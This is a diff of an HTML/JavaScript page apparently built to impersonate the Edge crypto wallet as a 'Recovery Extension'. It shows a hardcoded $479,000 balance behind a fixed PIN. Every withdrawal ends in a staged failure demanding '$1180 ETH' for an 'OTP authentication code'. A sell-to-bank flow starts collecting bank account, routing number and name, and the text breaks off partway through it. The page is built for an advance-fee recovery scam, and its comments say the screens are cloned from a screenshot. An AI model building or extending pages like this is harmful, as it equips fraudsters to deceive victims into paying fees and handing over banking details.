@@ -1,167 +1,756 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Edge Wallet</title>
+  <meta charset="UTF-8">
+  <title>Edge Wallet | Recovery Extension</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg-dark: #0f1115;
-      --card-dark: #1a1c22;
-      --accent: #00ffc3;
-      --accent-hover: #00ddb3;
-      --text-light: #ffffff;
-      --error: #ff4c4c;
+      --edge-bg: #18191d;
+      --edge-dark: #18191d;
+      --edge-card: #232427;
+      --edge-panel: #232427;
+      --edge-light: #292a30;
+      --edge-green: #14ea8f;
+      --edge-yellow: #ffc400;
+      --edge-grey: #888a8b;
+      --edge-border: #36373a;
+      --edge-shadow: 0 4px 24px 0 #000a;
+      --edge-radius: 22px;
+      --edge-blue: #51ffc9;
+      --edge-text: #e9e9e9;
+      --edge-muted: #b7b7b7;
+      --edge-eth: #fff;
+      --edge-nav-active: #14ea8f;
+      --edge-nav-inactive: #b7b7b7;
+      --edge-balance-glow: #bce778;
     }
-
-    body {
+    html, body {
+      background: var(--edge-bg);
+      min-height: 100vh;
+      color: var(--edge-text);
+      font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: var(--bg-dark);
-      color: var(--text-light);
+      padding: 0;
+      font-size: 16px;
+      letter-spacing: 0.02em;
+      user-select: none;
+    }
+    #app {
+      min-height: 100vh;
+      width: 100vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      background: var(--edge-bg);
+      position: relative;
+    }
+    /* Splash */
+    .splash-screen {
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--edge-dark);
+      font-size: 2.2em;
+      font-weight: 700;
+      color: var(--edge-green);
+      letter-spacing: 0.04em;
+      z-index: 9999;
+      position: fixed;
+      left: 0; top: 0;
+    }
+    /* PIN */
+    .pin-container {
+      width: 100vw;
+      min-height: 100vh;
+      background: radial-gradient(ellipse at 30% 80%, #18191d 70%, #232427 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 32px;
+      position: relative;
+    }
+    .pin-header {
+      width: 100%;
+      padding: 0 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 1.05em;
+      color: var(--edge-muted);
+      font-weight: 500;
+      margin-bottom: 26px;
+    }
+    .edge-logo-pin {
+      width: 88px;
+      margin: 0 auto 18px auto;
+      display: block;
+      filter: brightness(1.15) drop-shadow(0 2px 6px #14ea8f33);
+    }
+    .pin-username {
+      color: var(--edge-text);
+      font-size: 1.28em;
+      text-align: center;
+      font-weight: 500;
+      margin-bottom: 18px;
+      letter-spacing: 0.03em;
+    }
+    .pin-circles {
       display: flex;
       justify-content: center;
+      gap: 18px;
+      margin-bottom: 24px;
+    }
+    .pin-circle {
+      width: 32px; height: 32px; border-radius: 50%; border: 2.5px solid #fff;
+      background: transparent; display: flex; align-items: center; justify-content: center;
+      font-size: 1.7em; color: var(--edge-green); box-sizing: border-box; transition: border 0.18s;
+    }
+    .pin-circle.filled { background: var(--edge-green); border-color: var(--edge-green); color: #232427; }
+    .face-id-section { display: flex; flex-direction: column; align-items: center; margin-bottom: 18px; }
+    .face-id-icon { font-size: 2.3em; color: var(--edge-green); margin-bottom: 6px; }
+    .face-id-text { color: var(--edge-green); font-size: 1.08em; font-weight: 600; text-align: center; }
+    .pin-keypad { display: grid; grid-template-columns: repeat(3, 65px); grid-gap: 18px 24px; justify-content: center; margin: 0 auto 30px auto; margin-top: 8px; }
+    .pin-key { width: 65px; height: 65px; background: none; border: none; border-radius: 50%; font-size: 2em; color: var(--edge-green); font-weight: 600; cursor: pointer; box-shadow: 0 2px 8px #14ea8f11; transition: background 0.14s; outline: none; display: flex; align-items: center; justify-content: center; }
+    .pin-key:active { background: #14ea8f22; }
+    .pin-key.delete { font-size: 1.34em; color: #e24c4b; font-weight: 700; }
+    .pin-error { color: var(--edge-yellow); font-size: 1.1em; text-align: center; margin-bottom: 18px; font-weight: 600; min-height: 18px; }
+    /* Dashboard */
+    .dashboard-bg {
+      width: 100vw;
+      min-height: 100vh;
+      background: radial-gradient(circle at 30% 70%, #232427 55%, #18191d 100%);
+      display: flex;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      padding-bottom: 88px;
+      overflow-x: hidden;
     }
-
-    .container {
+    .dashboard-header-row {
       width: 100%;
-      max-width: 420px;
-      padding: 30px;
-      background-color: var(--card-dark);
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0, 255, 195, 0.1);
-      transition: all 0.3s ease;
+      max-width: 430px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 22px 22px 0 22px;
     }
-
-    h1, h2 {
-      text-align: center;
-      margin-bottom: 20px;
+    .dashboard-logo { width: 36px; filter: brightness(1.15); }
+    .dashboard-balance-card {
+      background: rgba(36,37,43,0.95);
+      border-radius: 24px;
+      box-shadow: 0 3px 24px 0 #0008;
+      max-width: 430px; width: 96vw;
+      margin: 0 auto 22px auto;
+      position: relative;
+      padding: 22px 20px 18px 20px;
+      color: #fff;
+      border: 1.5px solid var(--edge-border);
     }
-
-    .logo {
-      text-align: center;
-      font-size: 1.5em;
-      font-weight: bold;
-      color: var(--accent);
+    .dashboard-balance-label-row {
+      display: flex; align-items: center; justify-content: space-between; margin-bottom: 3px;
+    }
+    .dashboard-balance-label { font-size: 1.09em; color: #e9e9e9; font-weight: 500; }
+    .dashboard-balance-eye { color: #14ea8f; font-size: 1em; margin-left: 7px; }
+    .dashboard-balance-assets-link { color: var(--edge-green); font-weight: 600; font-size: 1em; text-decoration: underline; cursor: pointer; }
+    .dashboard-balance-amt {
+      font-size: 2.15em;
+      font-weight: 700;
+      color: #bce778;
+      text-shadow: 0 2px 8px #292a30, 0 0 4px #292a30;
       margin-bottom: 10px;
+      margin-top: 3px;
+      font-family: inherit;
     }
-
-    input[type="password"] {
-      width: 100%;
-      padding: 15px;
-      margin: 20px 0;
-      font-size: 1em;
-      border: none;
-      border-radius: 8px;
-      background-color: #2a2d36;
-      color: var(--text-light);
+    .dashboard-actions-row {
+      width: 100%; display: flex; gap: 13px; margin-bottom: 8px; justify-content: center;
     }
-
-    button {
-      width: 100%;
-      padding: 15px;
-      margin: 10px 0;
-      font-size: 1em;
+    .dashboard-action-btn {
+      background: rgba(255,255,255,0.13);
+      color: #fff;
+      font-weight: 600;
+      font-size: 1.09em;
       border: none;
-      border-radius: 8px;
+      border-radius: 18px;
+      padding: 0.93em 1.3em;
       cursor: pointer;
-      background-color: var(--accent);
-      color: #000;
-      transition: background-color 0.3s ease;
+      box-shadow: 0 2px 10px #14ea8f15;
+      outline: none;
+      transition: background 0.2s, color 0.2s;
     }
-
-    button:hover {
-      background-color: var(--accent-hover);
+    .dashboard-action-btn:active, .dashboard-action-btn:hover {
+      background: #18191d;
+      color: #14ea8f;
     }
-
-    .balance {
-      font-size: 2em;
-      text-align: center;
-      margin: 20px 0;
-      color: var(--accent);
+    .dashboard-grid-row {
+      width: 100%; max-width: 430px; display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 22px auto 0 auto;
     }
-
-    .error {
-      color: var(--error);
-      text-align: center;
-      margin: 20px 0;
-      font-weight: bold;
+    .dashboard-grid-card {
+      background: rgba(36,37,43,0.83);
+      border-radius: 17px;
+      box-shadow: 0 1px 8px #18191d44;
+      padding: 22px 13px 18px 13px;
+      color: #fff;
+      min-height: 130px;
+      display: flex; flex-direction: column; align-items: flex-start;
+      font-size: 1.04em;
+      position: relative;
+      border: 1.2px solid #36373a;
+      cursor: pointer;
+      transition: background 0.2s;
     }
-
-    .hidden {
-      display: none;
+    .dashboard-grid-card:active, .dashboard-grid-card:hover { background: #292a30; }
+    .dashboard-grid-title { font-size: 1.05em; font-weight: 700; margin-bottom: 0.5em; }
+    .dashboard-grid-desc { font-size: 0.96em; color: #e9e9e9; opacity: 0.85; }
+    /* Nav */
+    .dashboard-nav-row {
+      position: fixed; bottom: 0; left: 0;
+      width: 100vw; height: 70px;
+      background: #18191d;
+      border-top: 1.5px solid #282828;
+      box-shadow: 0 -2px 15px #000b;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
     }
-
-    .footer {
-      text-align: center;
-      font-size: 0.9em;
-      color: #888;
-      margin-top: 20px;
+    .dashboard-nav-inner {
+      width: 100vw;
+      max-width: 430px;
+      height: 70px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 32px;
+    }
+    .dashboard-nav-btn {
+      display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px;
+      color: var(--edge-nav-inactive); font-size: 1.15em; cursor: pointer; font-weight: 600; transition: color 0.19s;
+    }
+    .dashboard-nav-btn.active { color: var(--edge-nav-active); }
+    .dashboard-nav-icon { font-size: 1.8em; }
+    /* Popup Modal */
+    .popup-modal {
+      position: fixed; left: 0; top: 0; width: 100vw; height: 100vh;
+      background: #191a1eec; z-index: 9999;
+      display: flex; align-items: center; justify-content: center;
+      animation: fadein 0.21s;
+    }
+    @keyframes fadein {
+      from { opacity: 0; } to { opacity: 1; }
+    }
+    .edge-card.popup-card {
+      min-width: 320px; max-width: 390px; margin: 0 auto;
+    }
+    /* Withdraw/Sell modals */
+    .crypto-list, .bank-list {
+      display: flex; flex-wrap: wrap; gap: 13px; justify-content: flex-start;
+      margin-bottom: 18px; margin-top: 5px;
+    }
+    .crypto-item, .bank-item {
+      background: #232427; color: #14ea8f; border: 1.3px solid #14ea8f;
+      border-radius: 10px; font-weight: 700; font-size: 1em; padding: 7px 16px;
+      cursor: pointer; margin-bottom: 6px;
+      transition: background 0.15s, color 0.14s;
+    }
+    .crypto-item.selected, .crypto-item:active,
+    .bank-item.selected, .bank-item:active {
+      background: #14ea8f; color: #232427;
+    }
+    .modal-input { width: 100%; padding: 0.8em 1em; font-size: 1em; border-radius: 9px; border: 1.5px solid var(--edge-border); margin-bottom: 1em; background-color: var(--edge-light); color: var(--edge-text); box-sizing: border-box; outline: none; font-family: inherit; transition: border-color 0.2s; }
+    .modal-input:focus { border-color: var(--edge-green); }
+    .modal-label { font-weight: 500; margin-bottom: 0.2em; color: var(--edge-grey); display: block; }
+    .modal-btn { background: var(--edge-green); color: #18191d; border-radius: 10px; border: none; font-size: 1.07em; font-weight: 700; padding: 0.9em 1.3em; margin-top: 1em; cursor: pointer; box-shadow: 0 2px 12px rgba(20,234,143,0.09); transition: background 0.2s, color 0.2s, box-shadow 0.2s; width: 100%; outline: none; }
+    .modal-btn:active, .modal-btn:hover { background: #1be7a4; color: #232427; }
+    .pending-status { font-size: 1.2em; color: var(--edge-blue); margin-bottom: 1em; text-align: center; font-weight: 700; }
+    .otp-error { color: var(--edge-yellow); font-size: 1.09em; font-weight: 700; text-align: center; margin-top: 2em; }
+    /* Assets */
+    .assets-bg {
+      width: 100vw;
+      min-height: 100vh;
+      background: radial-gradient(circle at 30% 70%, #232427 55%, #18191d 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-bottom: 88px;
+      overflow-x: hidden;
+    }
+    .assets-header-row {
+      width: 100%; max-width: 430px; display: flex; align-items: center; justify-content: space-between; padding: 22px 22px 0 22px;
+    }
+    .assets-logo { width: 36px; filter: brightness(1.15); }
+    .assets-title-row { width: 100%; max-width: 430px; display: flex; align-items: center; justify-content: space-between; margin-top: 5px; }
+    .assets-title { font-size: 2.05em; font-weight: 700; color: #fff; }
+    .assets-eth-summary { font-size: 1.08em; color: #b7b7b7; font-weight: 500; margin-top: 2px; }
+    .assets-balance-row { width: 100%; max-width: 430px; display: flex; align-items: center; justify-content: flex-end; margin-top: 7px; }
+    .assets-balance-label { font-size: 1em; color: #b7b7b7; font-weight: 500; }
+    .assets-balance-amt { font-size: 1.12em; color: var(--edge-green); font-weight: 700; margin-left: 7px; }
+    .assets-receive-card {
+      background: rgba(36,37,43,0.95);
+      border-radius: 24px;
+      box-shadow: 0 3px 24px 0 #0008;
+      max-width: 430px; width: 96vw; margin: 16px auto 18px auto;
+      position: relative; padding: 19px 20px 12px 20px; color: #fff; border: 1.5px solid var(--edge-border);
+    }
+    .assets-receive-row { display: flex; align-items: center; gap: 6px; margin-bottom: 10px; }
+    .assets-receive-icon { width: 29px; height: 29px; border-radius: 50%; background: #18191d; display: flex; align-items: center; justify-content: center; margin-right: 8px;}
+    .assets-receive-title { font-size: 1.08em; font-weight: 600; color: #fff;}
+    .assets-edit-row { background: #292a30; border-radius: 11px; padding: 9px 12px; color: #b7b7b7; font-size: 1.12em; margin-bottom: 13px; display: flex; align-items: center; gap: 9px; }
+    .assets-edit-arrow { color: var(--edge-green); font-size: 1.13em; margin-left: 6px;}
+    .assets-edit-input { border: none; background: transparent; color: #fff; font-size: 1.07em; width: 80px; margin-left: 7px; padding: 0; outline: none;}
+    .assets-qr-row { width: 100%; display: flex; align-items: center; justify-content: center; margin-bottom: 13px;}
+    .assets-qr-img { width: 200px; height: 200px; border-radius: 18px; background: #fff; box-shadow: 0 1px 10px #14ea8f22; position: relative;}
+    .assets-qr-eth-icon { position: absolute; left: 50%; top: 50%; transform: translate(-50%,-50%); width: 35px; height: 35px; border-radius: 50%; background: #232427; display: flex; align-items: center; justify-content: center; border: 2px solid #14ea8f; }
+    .assets-wallet-row { width: 100%; display: flex; align-items: center; justify-content: flex-start; margin-bottom: 7px; }
+    .assets-wallet-label { color: #fff; font-weight: 500; font-size: 1.09em; margin-right: 6px;}
+    .assets-wallet-arrow { color: var(--edge-green); font-size: 1.13em; margin-left: 6px;}
+    .assets-wallet-addr { color: #b7b7b7; font-size: 0.99em; word-break: break-all; }
+    /* Responsive */
+    @media (max-width: 500px) {
+      .dashboard-header-row, .dashboard-balance-card, .dashboard-grid-row, .assets-header-row, .assets-title-row, .assets-balance-row, .assets-receive-card { max-width: 99vw; }
+      .dashboard-bg, .assets-bg { padding-bottom: 80px;}
+      .dashboard-nav-inner { padding: 0 11vw;}
+      .dashboard-nav-row { height: 58px;}
     }
   </style>
 </head>
 <body>
-
-  <!-- Welcome/Login Screen -->
-  <div class="container" id="login-screen">
-    <div class="logo">EDGE WALLET</div>
-    <h1>Welcome Back</h1>
-    <p style="text-align:center;">Securely access your wallet</p>
-    <input type="password" id="password" placeholder="Enter your password" />
-    <button onclick="login()">Access Wallet</button>
-    <div class="footer">Powered by Edge Technologies</div>
-  </div>
-
-  <!-- Dashboard -->
-  <div class="container hidden" id="dashboard">
-    <div class="logo">EDGE WALLET</div>
-    <h2>Dashboard</h2>
-    <div class="balance">$479,000.00</div>
-    <button onclick="withdraw()">Withdraw Crypto</button>
-    <button onclick="sell()">Sell to Bank</button>
-    <div class="footer">Your funds are securely stored</div>
-  </div>
-
-  <!-- OTP Error Screen -->
-  <div class="container hidden" id="otp-error">
-    <div class="logo">EDGE WALLET</div>
-    <h2>Transaction Error</h2>
-    <div class="error">OTP Verification Failed. Please try again.</div>
-    <button onclick="goBack()">Back to Dashboard</button>
-    <div class="footer">Need help? Contact support</div>
-  </div>
-
-  <script>
-    function login() {
-      const password = document.getElementById('password').value;
-      if (password === 'edgewallet') {
-        document.getElementById('login-screen').classList.add('hidden');
-        document.getElementById('dashboard').classList.remove('hidden');
-      } else {
-        alert('Incorrect password. Try again.');
-      }
+<div id="app"></div>
+<script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>
+<script>
+  // Demo images/icons
+  const EDGE_LOGO_URL = "https://edge.app/images/logo-mark.svg"; // Use your logo
+  const FACE_ID_ICON = `<svg width="38" height="38" viewBox="0 0 48 48" fill="none"><rect x="10" y="22" width="28" height="14" rx="7" stroke="#14ea8f" stroke-width="2"/><rect x="4" y="4" width="40" height="40" rx="8" stroke="#14ea8f" stroke-width="2"/><circle cx="24" cy="29" r="3" fill="#14ea8f"/><rect x="17" y="16" width="14" height="2" rx="1" fill="#14ea8f"/></svg>`;
+  const ETH_ICON = `<svg width="29" height="29" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#18191d"/><path d="M16 6L22.5 16.5L16 28L9.5 16.5L16 6Z" fill="#14ea8f"/></svg>`;
+  // App state
+  let state = {
+    step: 'splash', // splash | pin | dashboard | withdraw | withdrawPreview | withdrawPending | sell | sellDetails | sellPreview | sellPending | assets
+    pin: '', pinError: '', username: 'flye777', correctPin: '5431',
+    balance: 479000.85, eth: 125.81, walletAddr: '0x1fD831934C8763C33F864989968D87CF81713055',
+    withdraw: { crypto: null, amount: '', address: '', txTime: null, preview: false, pending: false },
+    sell: { bank: null, account: '', routing: '', name: '', amount: '', preview: false, pending: false },
+    assets: { ethAmt: 125.81, usdAmt: 479000.85, editAmt: '', editMode: false }
+  };
+  const CRYPTO_OPTIONS = [
+    {symbol: 'ETH', name: 'Ethereum'}, {symbol: 'BTC', name: 'Bitcoin'}, {symbol: 'SOL', name: 'Solana'}, {symbol: 'USDT', name: 'Tether'}, {symbol: 'BNB', name: 'Binance'}, {symbol: 'MATIC', name: 'Polygon'}, {symbol: 'DOGE', name: 'Dogecoin'}, {symbol: 'ADA', name: 'Cardano'}, {symbol: 'XRP', name: 'Ripple'}, {symbol: 'TRX', name: 'Tron'}
+  ];
+  const BANK_OPTIONS = [
+    "Bank of America", "Chase", "Wells Fargo", "Citibank", "US Bank", "PNC", "Capital One", "TD Bank", "HSBC", "Santander", "Ally", "BB&T", "SunTrust", "Regions", "KeyBank", "Fifth Third", "Huntington", "M&T", "BMO Harris", "Charles Schwab", "Cash App", "Venmo", "Chime", "Revolut", "SoFi", "Green Dot", "American Express", "Discover", "Synchrony", "Navy Federal"
+  ];
+  function render() {
+    const app = document.getElementById('app');
+    app.innerHTML = '';
+    if (state.step === 'splash') renderSplash(app);
+    if (state.step === 'pin') renderPin(app);
+    if (state.step === 'dashboard') renderDashboard(app);
+    if (state.step === 'withdraw') renderWithdrawModal(app);
+    if (state.step === 'withdrawPreview') renderWithdrawPreview(app);
+    if (state.step === 'withdrawPending') renderWithdrawPending(app);
+    if (state.step === 'sell') renderSellModal(app);
+    if (state.step === 'sellDetails') renderSellDetailsModal(app);
+    if (state.step === 'sellPreview') renderSellPreview(app);
+    if (state.step === 'sellPending') renderSellPending(app);
+    if (state.step === 'assets') renderAssets(app);
+  }
+  function renderSplash(app) {
+    const splash = document.createElement('div');
+    splash.className = 'splash-screen';
+    splash.innerText = 'WELCOME TO EDGE RECOVERY EXTENSION';
+    app.appendChild(splash);
+    setTimeout(() => { state.step = 'pin'; render(); }, 3000);
+  }
+  function renderPin(app) {
+    // PIN entry interface, visually matching your screenshot
+    const container = document.createElement('div');
+    container.className = 'pin-container';
+    // Header
+    const header = document.createElement('div');
+    header.className = 'pin-header';
+    header.innerHTML = `<span>Exit PIN</span><span>Help</span>`;
+    container.appendChild(header);
+    // Logo
+    const logo = document.createElement('img');
+    logo.src = EDGE_LOGO_URL;
+    logo.alt = "Edge Logo";
+    logo.className = 'edge-logo-pin';
+    container.appendChild(logo);
+    // Username
+    const usernameDiv = document.createElement('div');
+    usernameDiv.className = 'pin-username';
+    usernameDiv.innerText = state.username;
+    container.appendChild(usernameDiv);
+    // Circles
+    const circlesDiv = document.createElement('div');
+    circlesDiv.className = 'pin-circles';
+    for (let i = 0; i < 4; i++) {
+      const c = document.createElement('div');
+      c.className = 'pin-circle' + (state.pin.length > i ? ' filled' : '');
+      c.innerHTML = state.pin.length > i ? '•' : '';
+      circlesDiv.appendChild(c);
     }
-
-    function withdraw() {
-      showOtpError();
-    }
-
-    function sell() {
-      showOtpError();
-    }
-
-    function showOtpError() {
-      document.getElementById('dashboard').classList.add('hidden');
-      document.getElementById('otp-error').classList.remove('hidden');
-    }
-
-    function goBack() {
-      document.getElementById('otp-error').classList.add('hidden');
-      document.getElementById('dashboard').classList.remove('hidden');
-    }
-  </script>
-
+    container.appendChild(circlesDiv);
+    // Error message
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'pin-error';
+    errorDiv.innerText = state.pinError || '';
+    container.appendChild(errorDiv);
+    // Face ID Section
+    const faceIDDiv = document.createElement('div');
+    faceIDDiv.className = 'face-id-section';
+    faceIDDiv.innerHTML = `<div class="face-id-icon">${FACE_ID_ICON}</div><div class="face-id-text">Use Face ID</div>`;
+    container.appendChild(faceIDDiv);
+    // Keypad
+    const keypad = document.createElement('div');
+    keypad.className = 'pin-keypad';
+    const keys = ['1','2','3','4','5','6','7','8','9','','0','del'];
+    keys.forEach((k, idx) => {
+      const keyBtn = document.createElement('button');
+      keyBtn.className = 'pin-key';
+      if (k === 'del') {
+        keyBtn.classList.add('delete'); keyBtn.innerHTML = '&#x2716;';
+        keyBtn.onclick = () => { state.pin = state.pin.slice(0, -1); state.pinError = ''; render(); };
+      } else if (k !== '') {
+        keyBtn.innerText = k;
+        keyBtn.onclick = () => {
+          if (state.pin.length < 4) {
+            state.pin += k; state.pinError = ''; render();
+            if (state.pin.length === 4) {
+              setTimeout(() => {
+                if (state.pin === state.correctPin) { state.pinError = ''; state.pin = ''; state.step = 'dashboard'; render(); }
+                else { state.pinError = 'Incorrect PIN. Try again.'; state.pin = ''; render(); }
+              }, 350);
+            }
+          }
+        };
+      } else { keyBtn.disabled = true; keyBtn.style.visibility = 'hidden'; }
+      keypad.appendChild(keyBtn);
+    });
+    container.appendChild(keypad);
+    app.appendChild(container);
+  }
+  function renderDashboard(app) {
+    // Dashboard main interface, cloned from your screenshot
+    const dashBg = document.createElement('div'); dashBg.className = 'dashboard-bg';
+    // Header row
+    const headerRow = document.createElement('div'); headerRow.className = 'dashboard-header-row';
+    headerRow.innerHTML = `<div style="color:#b7b7b7;font-weight:600;">Help</div>
+      <img src="${EDGE_LOGO_URL}" class="dashboard-logo" alt="Edge Logo">`;
+    dashBg.appendChild(headerRow);
+    // Balance card
+    const balCard = document.createElement('div'); balCard.className = 'dashboard-balance-card';
+    balCard.innerHTML = `
+      <div class="dashboard-balance-label-row">
+        <span class="dashboard-balance-label">Total Balance <span class="dashboard-balance-eye">👁️‍🗨️</span></span>
+        <span class="dashboard-balance-assets-link" id="dashboardAssetsBtn">View Assets</span>
+      </div>
+      <div class="dashboard-balance-amt">$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} USD</div>
+      <div class="dashboard-actions-row">
+        <button class="dashboard-action-btn" id="withdrawBtn">Withdrawal Crypto</button>
+        <button class="dashboard-action-btn" id="sellBtn">Sell to Bank</button>
+      </div>
+    `;
+    dashBg.appendChild(balCard);
+    // Grid cards
+    const gridRow = document.createElement('div'); gridRow.className = 'dashboard-grid-row';
+    gridRow.innerHTML = `
+      <div class="dashboard-grid-card" style="background:linear-gradient(135deg,#7b5e3e77,#232427 80%);">
+        <div class="dashboard-grid-title">Buy Crypto</div>
+        <div class="dashboard-grid-desc">Bank or cash to crypto</div>
+      </div>
+      <div class="dashboard-grid-card" style="background:linear-gradient(135deg,#3e6e7b77,#232427 80%);">
+        <div class="dashboard-grid-title">Sell Crypto</div>
+        <div class="dashboard-grid-desc">Crypto to bank or cash</div>
+      </div>
+      <div class="dashboard-grid-card" style="background:linear-gradient(135deg,#3e7b4e77,#232427 80%);">
+        <div class="dashboard-grid-title">Earn Crypto</div>
+        <div class="dashboard-grid-desc">Stake crypto for passive returns</div>
+      </div>
+      <div class="dashboard-grid-card" style="background:linear-gradient(135deg,#7b3e5e77,#232427 80%);">
+        <div class="dashboard-grid-title">Swap Crypto</div>
+        <div class="dashboard-grid-desc">Crypto to another crypto</div>
+      </div>
+    `;
+    dashBg.appendChild(gridRow);
+    // Nav bar
+    const navRow = document.createElement('div'); navRow.className = 'dashboard-nav-row';
+    navRow.innerHTML = `<div class="dashboard-nav-inner">
+      <div class="dashboard-nav-btn active" id="navHomeBtn">
+        <div class="dashboard-nav-icon">🏠</div>
+        <div>Home</div>
+      </div>
+      <div class="dashboard-nav-btn" id="navAssetsBtn">
+        <div class="dashboard-nav-icon">📁</div>
+        <div>Assets</div>
+      </div>
+    </div>`;
+    dashBg.appendChild(navRow);
+    app.appendChild(dashBg);
+    // Event handlers
+    setTimeout(() => {
+      document.getElementById('withdrawBtn').onclick = () => { state.withdraw = {crypto: null, amount: '', address: '', txTime: null, preview: false, pending: false}; state.step = 'withdraw'; render(); };
+      document.getElementById('sellBtn').onclick = () => { state.sell = {bank: null, account: '', routing: '', name: '', amount: '', preview: false, pending: false}; state.step = 'sell'; render(); };
+      document.getElementById('dashboardAssetsBtn').onclick = () => { state.step = 'assets'; render(); };
+      document.getElementById('navHomeBtn').onclick = () => { state.step = 'dashboard'; render(); };
+      document.getElementById('navAssetsBtn').onclick = () => { state.step = 'assets'; render(); };
+    }, 20);
+  }
+  function renderWithdrawModal(app) {
+    // Withdraw flow: select crypto, input amount/address
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <h3 style="margin-bottom:0.6em;">Withdraw Crypto</h3>
+        <label class="modal-label">Select Cryptocurrency:</label>
+        <div class="crypto-list" id="cryptoList"></div>
+        <label class="modal-label">Amount to Withdraw:</label>
+        <input class="modal-input" type="number" id="withdrawAmount" min="0" step="any" value="${state.withdraw.amount}" placeholder="Enter amount">
+        <label class="modal-label">Receiving Address:</label>
+        <input class="modal-input" type="text" id="withdrawAddress" value="${state.withdraw.address}" placeholder="Enter wallet address">
+        <button class="modal-btn" id="withdrawSubmitBtn" ${!state.withdraw.crypto||!state.withdraw.amount||!state.withdraw.address ? 'disabled' : ''}>Submit</button>
+        <button class="modal-btn" id="withdrawCancelBtn" style="background:#36373a;color:#fff;margin-top:.6em;">Cancel</button>
+      </div>
+    `;
+    app.appendChild(modal);
+    const cryptoList = modal.querySelector('#cryptoList');
+    CRYPTO_OPTIONS.forEach(opt => {
+      const c = document.createElement('div');
+      c.className = 'crypto-item' + (state.withdraw.crypto === opt.symbol ? ' selected' : '');
+      c.innerText = opt.symbol;
+      c.onclick = () => { state.withdraw.crypto = opt.symbol; render(); };
+      cryptoList.appendChild(c);
+    });
+    modal.querySelector('#withdrawAmount').oninput = e => { state.withdraw.amount = e.target.value; render(); };
+    modal.querySelector('#withdrawAddress').oninput = e => { state.withdraw.address = e.target.value; render(); };
+    modal.querySelector('#withdrawSubmitBtn').onclick = () => { state.withdraw.preview = true; state.withdraw.txTime = new Date().toLocaleString(); state.step = 'withdrawPreview'; render(); };
+    modal.querySelector('#withdrawCancelBtn').onclick = () => { state.step = 'dashboard'; render(); };
+  }
+  function renderWithdrawPreview(app) {
+    // Show transaction preview before "pending"
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <h3 style="margin-bottom:0.6em;">Transaction Preview</h3>
+        <div style="margin-bottom:1.1em;">
+          <span style="color:#14ea8f;font-weight:700;">Crypto:</span> ${state.withdraw.crypto}<br>
+          <span style="color:#14ea8f;font-weight:700;">Amount:</span> ${state.withdraw.amount}<br>
+          <span style="color:#14ea8f;font-weight:700;">Receiving Address:</span> ${state.withdraw.address}<br>
+          <span style="color:#14ea8f;font-weight:700;">Time:</span> ${state.withdraw.txTime}<br>
+          <span style="color:#14ea8f;font-weight:700;">Status:</span> Awaiting Confirmation
+        </div>
+        <button class="modal-btn" id="confirmWithdrawBtn">Confirm Transaction</button>
+        <button class="modal-btn" id="withdrawCancelBtn" style="background:#36373a;color:#fff;margin-top:.6em;">Cancel</button>
+      </div>
+    `;
+    app.appendChild(modal);
+    modal.querySelector('#confirmWithdrawBtn').onclick = () => { state.withdraw.pending = true; state.step = 'withdrawPending'; render(); };
+    modal.querySelector('#withdrawCancelBtn').onclick = () => { state.step = 'dashboard'; render(); };
+  }
+  function renderWithdrawPending(app) {
+    // Pending transaction, then OTP error
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <div class="pending-status">Pending Transaction...</div>
+        <div style="margin-bottom:2em;text-align:center;font-size:1.03em;color:#ffc400;">
+          Please wait while your transaction is processed...
+        </div>
+        <div id="pendingSpinner" style="text-align:center;margin-bottom:2em;">
+          <span style="font-size:2em;color:#14ea8f;">⏳</span>
+        </div>
+      </div>
+    `;
+    app.appendChild(modal);
+    setTimeout(() => {
+      modal.innerHTML = `
+        <div class="edge-card popup-card">
+          <div class="pending-status">Transaction Failed</div>
+          <div class="otp-error">
+            OTP AUTHENTICATION CODE REQUIRED<br>
+            <span style="color:#ffc400;">$1180 ETH NEEDED</span>
+          </div>
+          <button class="modal-btn" id="withdrawCloseBtn" style="margin-top:2em;">Return to Dashboard</button>
+        </div>
+      `;
+      modal.querySelector('#withdrawCloseBtn').onclick = () => { state.step = 'dashboard'; render(); };
+    }, 2100);
+  }
+  function renderSellModal(app) {
+    // Sell to bank: select bank/app
+    const modal = document.createElement('div');
+    modal.className = 'popup-modal';
+    modal.innerHTML = `
+      <div class="edge-card popup-card">
+        <h3 style="margin-bottom:0.6em;">Sell to Bank</h3>
+        <label class="modal-label">Select Bank or App:</label>
+        <div class="bank-list" id="bankList"></div>
+        <button class="modal-btn" id="sellNextBtn" ${!state.sell.bank ? 'disabled' : ''}>Next</button>
+        <button class="modal-btn" id="sellCancelBtn" style="background:#36373a;color:#fff;margin-top:.6em;">Cancel</button>
+      </div>
+    `;
+    app.appendChild(modal);
